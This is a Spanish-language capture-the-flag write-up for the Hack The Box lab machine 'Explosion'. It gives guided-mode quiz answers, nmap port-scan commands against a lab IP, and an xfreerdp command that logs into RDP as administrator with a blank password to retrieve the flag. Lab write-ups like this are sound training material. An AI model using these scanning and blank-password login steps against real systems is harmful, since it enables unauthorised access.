---
title: Writeup explosion - Hack The Box - Resolución y Análisis
published: true
tags:
  - hackthebox
  - writeup
  - explosion
  - ciberseguridad
  - pentesting
description: Writeup y resolución de la máquina explosion en Hack The Box.
keywords:
  - writeup explosion
  - hack the box explosion
  - resolución máquina explosion
  - explosion hack the box
  - htb explosion
---
---------
### 🔗 Accesos rápidos

- 📄 **Writeup online**: [Link](https://publish.obsidian.md/bunzopy/HTB/SuperFacil/Tier+0/Windows/Explosion)
- 📺 **Resolución en vivo (completa)**: [Link](https://www.youtube.com/watch?v=n9vKrxPCvTE)
- 🧠 **Explicación resumida**: [Link](https://www.youtube.com/watch?v=7NhsVvICHf0)

---

#veryeasy #windows  #startingpoint #nmap #ping #xfreerdp

----
# Guided Mode

1)¿Qué significa la sigla de 3 letras RDP? 
	 Remote Desktop Protocol

2)¿Qué es un acrónimo de 3 letras que se refiere a la interacción con el host a través de una interfaz de línea de comandos?
	CLI

3)¿Y las interacciones de la interfaz gráfica de usuario? 
	GUI

4)¿Cuál es el nombre de una antigua herramienta de acceso remoto que venía sin cifrado por defecto y escucha en el puerto TCP 23?  
	[[telnet]]

5)¿Cuál es el nombre del servicio que se ejecuta en el puerto 3389 TCP? 
	ms-wbt-server

6)¿Qué interruptor se utiliza para especificar la dirección IP del host de destino cuando se utiliza xfreerdp?  
	/v:

7)¿Qué nombre de usuario nos devuelve correctamente una proyección de escritorio con una contraseña en blanco?
	administrator

---------
# [[Reconocimiento de OS(Sistema operativo) y puertos abiertos con NMAP]]

```shell
ping -c 1 10.129.1.13
nmap -p- --open -vvv -n -Pn -sS --min-rate 5000 10.129.1.13 -oG allports 
extractPorts allports         
nmap -sCV -p135,139,445,3389,5985,47001,49664,49665,49666,49667,49668,49669,49670,49671 10.129.1.13 -oN target
```

![[Explosion1.png]]

![[Explosion2.png]]

![[Explosion3.png]]

![[Explosion4.png]]
*TTL:* Maquina windows
*Puertos relevantes:*
	`3389` [[xfreerdp]]

---------
# Intrusion a la maquina con [[xfreerdp]]

```shell
xfreerdp /v:10.129.1.13:3389 /u:administrator
```
Con este comando conseguis una interfaz remota en la maquina victima, y estaba la flag en un txt dentro del escritorio
![[Explosion5.png]]

---------
